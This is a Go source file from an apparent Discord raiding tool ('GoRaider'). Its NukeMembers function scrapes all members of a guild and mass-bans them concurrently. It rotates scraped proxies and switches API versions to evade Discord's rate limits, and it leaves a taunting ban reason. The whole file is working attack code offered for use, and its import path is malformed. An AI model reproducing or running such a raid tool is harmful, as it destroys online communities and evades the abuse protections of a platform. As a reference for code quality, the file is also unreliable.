package api

import (
	"fmt"
	"net/url"
	"os/exec"
	"sync"
	"time"

	"https://github.com/goodwitchh/GoRaider/tree/main/utils"
	"github.com/valyala/fastjson"
)

func ban(userID string, wg *sync.WaitGroup) {
	defer wg.Done()
	wg.Add(1)

	if len(proxies) <= proxyCount {
		proxyCount = 1
	}
	
	res, stat := utils.SendRequest("PUT", fmt.Sprintf("https://discord.com/api/v%d/guilds/%s/bans/%s?reason=%s", memberAPI, utils.GuildID, userID, url.QueryEscape("should've used https://github.com/Not-Cyrus/GoGuardian")), "", proxies[proxyCount], nil)

	switch {
	case stat == 0 && len(proxies) <= proxyCount:
		proxyCount++    // failed proxy?
		ban(userID, wg) // nothing could go wrong by doing this... right?
	case stat == 204:
		banCount++ // we got a proper ban, so keep using the same proxy.
	case stat == 400:
		ban(userID, wg) // WOW NOTHING GOES WRONG WITH THIS!!
	case stat == 429:
		if len(res) == 0 {
			return
		}
		
		err := fastjson.Validate(res)
		if err != nil {
			return
		}

		parsed, err := parser.Parse(res)
		if err != nil {
			return
		}
		
		timeout := time.Duration(parsed.GetFloat64("retry_after")) * time.Second

		if !scrapingProxies && len(proxies) <= proxyCount && timeout > proxyTimeout {
			scrapingProxies = true
			startProxies := time.Now()
			proxies = utils.GetProxies()
			TotalProxies += len(proxies)
			proxyTime := time.Since(startProxies)
			scrapingProxies = false
			coolColour.Printf("Scraped another %d proxies in %s\n", len(proxies), proxyTime)
		}

		switch parsed.GetBool("global") {

		case true && len(proxies) <= proxyCount:
			proxyCount++ // we got a global rate limit so we should probably switch proxies
		case false:
			if memberAPI <= 8 {
				memberAPI = 6
			}
			memberAPI++
		}
		ban(userID, wg) // nothing could go wrong by doing this... right?
	}
}

func banUsers(array []string) {
	var wg sync.WaitGroup
	for _, user := range array {
		if len(user) != 0 {
			go ban(user, &wg)
		}
	}
	wg.Wait()
}

func NukeMembers() {
	switch utils.JsonData.GetBool("Bot") {
	case true:
		_, banArray = utils.GetData("https://discord.com/api/v8/guilds/%s/members?limit=1000", "user", "id")
	default:
		memberJSON, err := exec.Command("python", "Scraper.py").Output()
		if err != nil {
			fmt.Printf("Err: could not scrape properly: %s\n", err.Error())
			return
		}
		banArray = utils.ReadData(string(memberJSON))
	}
	banUsers(banArray)
}

var (
	banArray        []string
	banCount        int  = 0
	memberAPI       int  = 6
	proxyCount      int  = 1
	proxyTimeout         = time.Duration(50) * time.Millisecond
	scrapingProxies bool = false
)
